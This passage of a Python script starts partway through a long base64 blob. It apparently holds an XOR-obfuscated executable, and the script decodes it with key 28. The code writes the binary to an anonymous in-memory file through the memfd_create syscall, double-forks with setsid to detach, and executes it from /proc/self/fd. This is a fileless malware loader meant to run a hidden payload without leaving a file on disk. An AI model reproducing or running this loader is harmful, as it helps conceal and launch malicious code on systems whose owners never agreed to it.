HBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcPA8cHBwcHBz8DhwcHBwcHB0cHBwcHBwcHRwcHBwcHBwdHBwcHBwcHHQcHBwcHBwcEBwcHBwcHBwcDBwcHBwcHBEcHBwcHBwciAocHBwcHBwFHBwcHBwcHCwhHBwcHBwcBxwcHBwcHBwUHBwcHBwcHAYcHBwcHBwcJCEcHBwcHBwAHBwcHBwcHBQcHBwcHBwc6eLjcxwcHBy8HxwcHBwcHBkcHBwcHBwcxBkcHBwcHBwaHBwcHBwcHNQfHBwcHBwcFhwcHBwcHBwIHRwcHBwcHBccHBwcHBwcBBwcHBwcHBwJHBwcHBwcHBwcHBwcHBwcHxwcHBwcHBxcIxwcHBwcHB4cHBwcHBwcnB0cHBwcHBwIHBwcHBwcHBscHBwcHBwcCxwcHBwcHBw0FBwcHBwcHBscHBwcHBwcdBscHBwcHBwUHBwcHBwcHNwcHBwcHBwcFRwcHBwcHBwEHBwcHBwcHAIcHBwcHBwcFBwcHBwcHBzn4+NzHBwcHB0cHBQcHBwc4uPjcxwcHBwEGxwcHBwcHOPj43McHBwcHhwcHBwcHBzs4+NzHBwcHPAaHBwcHBwc5ePjcxwcHBwfHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcXCEcHBwcHBwcHBwcHBwcHBwcHBwcHBwcLAwcHBwcHBxcDBwcHBwcHEwMHBwcHBwcfAwcHBwcHBxsDBwcHBwcHJwMHBwcHBwcjAwcHBwcHBy8DBwcHBwcHKwMHBwcHBwc3AwcHBwcHBzMDBwcHBwcHPwMHBwcHBwc7AwcHBwcHBwcDRwcHBwcHAwNHBwcHBwcPA0cHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwUXBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwzaW9uM351cjNsfW9va3gcHBwcHBwcHBwcHBwcHBwcHGNZUFoeHR0cHBwcHBwcHBweHCIcHRwcHGQcXBwcHBwcXBwcHBwcHBwcHBwcHBwcHBwcHBxcHCQcHRwcHBwcHBwdHBwcGxwcHBwcHBwcHBwcHBxcHBwcHBwcHFwcHBwcHK0cHBwcHBwc9hwcHBwcHBwcDBwcHBwcHFQt43Z1RBMZdidEhVSnM351cjNvdBxPVJX7dDF/HBxUlfpO9BYcHBwzfnVyM359b3QcSktUlfoTGRwcHK0cHBxbX18mPDRJfmlyaGk8JTIvMiwxLStpfmlyaGktYi4sMiwoNTwlMi8yLBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHxwdHAQfHBwcHBwcHBwcHBwcHBwcHBwcHxweHCQfHBwcHBwcHBwcHBwcHBwcHBwcHxwfHEQfHBwcHBwcHBwcHBwcHBwcHBwcHxwYHGAfHBwcHBwcHBwcHBwcHBwcHBwcHxwZHLwfHBwcHBwcHBwcHBwcHBwcHBwcHxwaHNQfHBwcHBwcHBwcHBwcHBwcHBwcHxwbHMQZHBwcHBwcHBwcHBwcHBwcHBwcHxwUHPAaHBwcHBwcHBwcHBwcHBwcHBwcHxwVHAQbHBwcHBwcHBwcHBwcHBwcHBwcHxwWHHQbHBwcHBwcHBwcHBwcHBwcHBwcHxwXHDQUHBwcHBwcHBwcHBwcHBwcHBwcHxwQHBwMHBwcHBwcHBwcHBwcHBwcHBwcHxwRHDwMHBwcHBwcHBwcHBwcHBwcHBwcHxwSHCwNHBwcHBwcHBwcHBwcHBwcHBwcHxwTHFwNHBwcHBwcHBwcHBwcHBwcHBwcHxwMHFwOHBwcHBwcHBwcHBwcHBwcHBwcHxwNHIgKHBwcHBwcHBwcHBwcHBwcHBwcHxwOHBw8HBwcHBwcHBwcHBwcHBwcHBwcHxwPHLg9HBwcHBwcHBwcHBwcHBwcHBwcHxwIHOQ9HBwcHBwcHBwcHBwcHBwcHBwcHxwJHCwhHBwcHBwcHBwcHBwcHBwcHBwcHxwKHCQhHBwcHBwcHBwcHBwcHBwcHBwcHxwLHFwhHBwcHBwcHBwcHBwcHBwcHBwcHxwEHFwjHBwcHBwcHBwcHBwcHBwcHBwcHxwFHBxcHBwcHBwcHBwcHBwcHBwcHBwcHxwGHBxdHBwcHBwcHBwcHBwcHBwcHBwcHxwHHBwcHBwcHBwcHBwcHBwcHBwdHBwcGBzt4xwcHBwcHBwcHBwcHBwcHBwQHBwcHhwMHGwOHBwcHBwcHBwcHBwcHBwSHBwcHhwMHLwOHBwcHBwcHBwcHBwcHBw9HBwcHhwMHPwOHBwcHBwcHBwcHBwcHBwrHBwcHRwGHBxdHBwcHBwcHRwcHBwcHBxaHBwcHRwKHCQhHBwcHBwcHBwcHBwcHBxxHBwcHhwMHDwPHBwcHBwcHBwcHBwcHBxlHBwcHRwJHCwhHBwcHBwcHBwcHBwcHByEHBwcGBzt4xwcHBwcHBwcHBwcHBwcHBwdHBwcGBzt4xwcHBwcHBwcHBwcHBwcHByCHBwcHRwIHCg/HBwcHBwcHBwcHBwcHBwcHBwcGBzt4xwcHBwcHBwcHBwcHBwcHBzvHhwcHhwMHJwKHBwcHBwcDxwcHBwcHBywHBwcHBwJHCQhHBwcHBwcHBwcHBwcHByhHBwcHRwLHFwhHBwcHBwcHBwcHBwcHBzaHBwcHBwJHCwhHBwcHBwcHBwcHBwcHBzFHBwcHBwPHLg9HBwcHBwcHBwcHBwcHBzwHBwcHRwEHFwjHBwcHBwcHBwcHBwcHBxGHhwcHhwQHBwMHBwcHBwcHBwcHBwcHBweHRwcDhwMHGwKHBwcHBwcGRwcHBwcHBwOHRwcDhwcHBwcHBwcHBwcHBwcHBwcHBwyHRwcPBwcHBwcHBwcHBwcHBwcHBwcHBzhHRwcPBwFHBxcHBwcHBwcHBwcHBwcHBxWHRwcDhwcHBwcHBwcHBwcHBwcHBwcHBxAHRwcDhwcHBwcHBwcHBwcHBwcHBwcHBxsHRwcDhwMHDUPHBwcHBwcfhwcHBwcHBxiHRwcDBwFHORcHBwcHBwcHBwcHBwcHBwQHRwcDh4NHIgKHBwcHBwcHBwcHBwcHByZHRwcDRwGHDxdHBwcHBwcjBwcHBwcHByUHRwcDhwcHBwcHBwcHBwcHBwcHBwcHBy4HRwcDRwGHKxdHBwcHBwcGBwcHBwcHBy6HRwcDhwcHBwcHBwcHBwcHBwcHBwcHBykHRwcDhwcHBwcHBwcHBwcHBwcHBwcHByAHhwcDhwcHBwcHBwcHBwcHBwcHBwcHBzQHRwcDRwGHKRdHBwcHBwcFBwcHBwcHBzMHRwcDhwcHBwcHBwcHBwcHBwcHBwcHBzzHRwcDRwFHDxcHBwcHBwcDBwcHBwcHBznHRwcDBwFHBxcHBwcHBwcHBwcHBwcHBwUHhwcDRwFHOhcHBwcHBwcGBwcHBwcHBwTHhwcPBwcHBwcHBwcHBwcHBwcHBwcHBwCHhwcDR4FHBRcHBwcHBwcHBwcHBwcHBw3HhwcDRwOHBw8HBwcHBwcGBwcHBwcHBwmHhwcDhwcHBwcHBwcHBwcHBwcHBwcHBxQHhwcDRwGHNxdHBwcHBwcFBwcHBwcHBxMHhwcDhwMHBwKHBwcHBwceRwcHBwcHBx8HhwcDhwcHBwcHBwcHBwcHBwcHBwcHBykHBwcDBwGHMxdHBwcHBwcHBwcHBwcHBwdHhwcDhwMHFwOHBwcHBwcMxwcHBwcHBxqHhwcDhwcHBwcHBwcHBwcHBwcHBwcHByWHhwcDRwGHNRdHBwcHBwcGBwcHBwcHBySHhwcDBwGHORcHBwcHBwcHBwcHBwcHByGHhwcDhwcHBwcHBwcHBwcHBwcHBwcHBysHhwcDhwMHJcPHBwcHBwcdB4cHBwcHBypHhwcDhwcHBwcHBwcHBwcHBwcHBwcHBzWHhwcDhwcHBwcHBwcHBwcHBwcHBwcHBzDHhwcDhwcHBwcHBwcHBwcHBwcHBwcHBztHhwcDh4MHJwKHBwcHBwcDxwcHBwcHBzlHhwcDhwcHBwcHBwcHBwcHBwcHBwcHBwPHxwcDR4FHORcHBwcHBwcHBwcHBwcHBwDHxwcPBwcHBwcHBwcHBwcHBwcHBwcHBwlHxwcDRwFHFxcHBwcHBwcrRwcHBwcHBxYHxwcPhwcHBwcHBwcHBwcHBwcHBwcHBx8HxwcDhwcHBwcHBwcHBwcHBwcHBwcHBwcf25ob2hpenoyfxx4eW55e3VvaHluQ2hxQ39wc3J5bxxDQ3hzQ3twc359cEN4aHNub0N9aWQcf3NxbHB5aHl4MiQsKiwcQ0N4c0N7cHN+fXBDeGhzbm9DfWlkQ3p1cnVDfW5ufWVDeXJobmUcem59cXlDeGlxcWUcQ0N6bn1xeUN4aXFxZUN1cnVoQ31ubn1lQ3lyaG5lHH8sazJ/HENDWk5dUVlDWVJYQ0McQ0N1cnVoQ31ubn1lQ3lyeBxDWEVSXVFVXxxDQ3VydWhDfW5ufWVDb2h9bmgcQ0NbUklDWVRDWk5dUVlDVFhOHENbUFNeXVBDU1paT1lIQ0hdXlBZQxxDQ3B1fn9Df29pQ3p1cnUcbGh0bnl9eEN/bnl9aHlcXFtQVV5fQy4yLjIpHENVSFFDeHlueXt1b2h5bkhRX3BzcnlIfX5weRxsaWhvXFxbUFVeX0MuMi4yKRx7eWhsdXhcXFtQVV5fQy4yLjIpHHF9eGp1b3lIdG55fXgcQ3l4fWh9HG9oHENDb2h9f3dDf3R3Q3p9dXBcXFtQVV5fQy4yKBx6HHFxfWxcXFtQVV5fQy4yLjIpHG9lb2h5cVxcW1BVXl9DLjIuMikccX1sHENDcHV+f0NvaH1uaENxfXVyXFxbUFVeX0MuMi4yKRxvaXV4Q351cn1uZRxDQ3h9aH1Db2h9bmgcb39DcHlyHENDe3FzckNvaH1uaENDHENDeG9zQ3R9cnhweRxDVVNDb2h4dXJDaW95eBx3dXBwXFxbUFVeX0MuMi4yKRxsaHQcQ0NwdX5/Q39vaUN1cnVoHENDemRvaH1oXFxbUFVeX0MuMi4yKRxsaG59f3lcXFtQVV5fQy4yLjIpHGx1eBxDQ35vb0NvaH1uaBx9b2xudXJoelxcW1BVXl9DLjIuMikccX11chxxfXhqdW95XFxbUFVeX0MuMi4yKRxrfXVobHV4XFxbUFVeX0MuMi4yKRxzbHlyXFxbUFVeX0MuMi4yKRxDQ3pvaH1oHGxodG55fXhDdnN1clxcW1BVXl9DLjIuMikcQ0NIUV9DWVJYQ0McQ1VIUUNueXt1b2h5bkhRX3BzcnlIfX5weRxvdHlwcEN/c3h5HENDf2R9Q3p1cn1wdWZ5XFxbUFVeX0MuMi4yKRx6c253XFxbUFVeX0MuMi4yKRwcMm9lcWh9fhwyb2huaH1+HDJvdG9obmh9fhwydXJoeW5sHDJyc2h5MntyaTJsbnNseW5oZRwycnNoeTJ7cmkyfml1cHgxdXgcMnJzaHkyXV5VMWh9exwye3JpMnR9b3QcMnhlcm9lcRwyeGVyb2huHDJ7cmkyanlub3Vzchwye3JpMmp5bm91c3JDbhwybnlwfTJ4ZXIcMm55cH0ybHBoHDJ1cnVoHDJscGgye3NoHDJscGgyb3l/HDJoeWRoHDJ6dXJ1HDJuc3h9aH0cMnl0Q3pufXF5Q3R4bhwyeXRDem59cXkcMnVydWhDfW5ufWUcMnp1cnVDfW5ufWUcMnhlcn1xdX8cMnh9aH0cMn5vbxwyf3NxcXlyaBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHAccHBwdHBwcHhwcHBwcHBwEHxwcHBwcHAQfHBwcHBwcABwcHBwcHBwcHBwcHBwcHB0cHBwcHBwcHBwcHBwcHBw/HBwcGxwcHB4cHBwcHBwcJB8cHBwcHBwkHxwcHBwcHDwcHBwcHBwcHBwcHBwcHBwUHBwcHBwcHBwcHBwcHBwcKhwcHBscHBweHBwcHBwcHEQfHBwcHBwcRB8cHBwcHBw4HBwcHBwcHBwcHBwcHBwcGBwcHBwcHBwcHBwcHBwcHFUcHBwbHBwcHhwcHBwcHBxgHxwcHBwcHGAfHBwcHBwcPBwcHBwcHBwcHBwcHBwcHBgcHBwcHBwcHBwcHBwcHBxLHBwc6uPjcx4cHBwcHBwcvB8cHBwcHBy8HxwcHBwcHDgcHBwcHBwcGhwcHBwcHBwUHBwcHBwcHBwcHBwcHBwcfRwcHBccHBweHBwcHBwcHNQfHBwcHBwc1B8cHBwcHBwMHhwcHBwcHBscHBwdHBwcFBwcHBwcHBwEHBwcHBwcHHUcHBwfHBwcHhwcHBwcHBzEGRwcHBwcHMQZHBwcHBwcCB0cHBwcHBwcHBwcHBwcHB0cHBwcHBwcHBwcHBwcHBxtHBwc4+Pjcx4cHBwcHBwc8BocHBwcHBzwGhwcHBwcHDAcHBwcHBwcGhwcHBwcHBweHBwcHBwcHB4cHBwcHBwcYhwcHOLj43MeHBwcHBwcHAQbHBwcHBwcBBscHBwcHBxMHBwcHBwcHBscHBweHBwcFBwcHBwcHBwcHBwcHBwcHJEcHBwYHBwcHhwcHBwcHBx0GxwcHBwcHHQbHBwcHBwc3BwcHBwcHBwaHBwcHBwcHBQcHBwcHBwcBBwcHBwcHByLHBwcGBwcHF4cHBwcHBwcNBQcHBwcHBw0FBwcHBwcHJwdHBwcHBwcGhwcHAQcHBwUHBwcHBwcHAQcHBwcHBwcvRwcHB0cHBwaHBwcHBwcHBwMHBwcHBwcHAwcHBwcHBwHHBwcHBwcHBwcHBwcHBwcGBwcHBwcHBwcHBwcHBwcHIAcHBwdHBwcGhwcHBwcHBw8DBwcHBwcHDwMHBwcHBwcDB0cHBwcHBwcHBwcHBwcHAwcHBwcHBwcDBwcHBwcHBy7HBwcHRwcHBocHBwcHBwcLA0cHBwcHBwsDRwcHBwcHAwcHBwcHBwcHBwcHBwcHBwMHBwcHBwcHAwcHBwcHBwcrBwcHB0cHBwaHBwcHBwcHFwNHBwcHBwcXA0cHBwcHBwcHRwcHBwcHBwcHBwcHBwcDBwcHBwcHBwMHBwcHBwcHKUcHBwdHBwcGhwcHBwcHBxcDhwcHBwcHFwOHBwcHBwcTxgcHBwcHBwcHBwcHBwcHAwcHBwcHBwcHBwcHBwcHByjHBwcHRwcHBocHBwcHBwciAocHBwcHByIChwcHBwcHBEcHBwcHBwcHBwcHBwcHBwYHBwcHBwcHBwcHBwcHBwc2RwcHB0cHBweHBwcHBwcHBw8HBwcHBwcHDwcHBwcHBy/HRwcHBwcHBwcHBwcHBwcFBwcHBwcHBwcHBwcHBwcHNEcHBwdHBwcHhwcHBwcHBy4PRwcHBwcHLg9HBwcHBwcSBwcHBwcHBwcHBwcHBwcHBgcHBwcHBwcHBwcHBwcHBzHHBwcHRwcHB4cHBwcHBwc5D0cHBwcHBzkPRwcHBwcHFwdHBwcHBwcHBwcHBwcHBwUHBwcHBwcHBwcHBwcHBwc+RwcHBIcHBwfHBwcHBwcHCwhHBwcHBwcLDEcHBwcHBwUHBwcHBwcHBwcHBwcHBwcFBwcHBwcHBwUHBwcHBwcHO0cHBwTHBwcHxwcHBwcHBwkIRwcHBwcHCQxHBwcHBwcFBwcHBwcHBwcHBwcHBwcHBQcHBwcHBwcFBwcHBwcHBzhHBwcGhwcHB8cHBwcHBwcXCEcHBwcHBxcMRwcHBwcHBweHBwcHBwcGxwcHBwcHBwUHBwcHBwcHAwcHBwcHBwctxwcHB0cHBwfHBwcHBwcHFwjHBwcHBwcXDMcHBwcHBzcHBwcHBwcHBwcHBwcHBwcFBwcHBwcHBwUHBwcHBwcHBodHBwdHBwcHxwcHBwcHBwcXBwcHBwcHBwsHBwcHBwc5BwcHBwcHBwcHBwcHBwcHDwcHBwcHBwcHBwcHBwcHBwQHRwcFBwcHB8cHBwcHBwcHF0cHBwcHBzkLBwcHBwcHMwcHBwcHBwcHBwcHBwcHBw8HBwcHBwcHBwcHBwcHBwcDR0cHB0cHBwsHBwcHBwcHBwcHBwcHBwc5CwcHBwcHBw2HBwcHBwcHBwcHBwcHBwcHRwcHBwcHBwdHBwcHBwcHB0cHBweHBwcHBwcHBwcHBwcHBwcHBwcHDQtHBwcHBwclBQcHBwcHBwBHBwcMxwcHBQcHBwcHBwcBBwcHBwcHBwVHBwcHxwcHBwcHBwcHBwcHBwcHBwcHBysJRwcHBwcHG4fHBwcHBwcHBwcHBwcHBwdHBwcHBwcHBwcHBwcHBwcDRwcHB8cHBwcHBwcHBwcHBwcHBwcHBwcPiEcHBwcHBwGHRwcHBwcHBwcHBwcHBwcHRwcHBwcHBwcHBwcHBwcHA==')
xkey = 28

binary = ''
for i in binx:
    binary += chr(ord(i)^xkey)


fd = ctypes.CDLL(None).syscall(319,"",1) # call memfd_create and create an anonymous file
final_fd = open('/proc/self/fd/'+str(fd),'wb') # write our executable file.
final_fd.write(binary)
final_fd.close()

fork1 = os.fork() #create a child
if 0 != fork1: os._exit(0)

ctypes.CDLL(None).syscall(112) # call setsid() to create a parent.

fork2 = os.fork() #create a child from the parent. 
if 0 != fork2: os._exit(0)

os.execl('/proc/self/fd/'+str(fd),'argv0','argv1')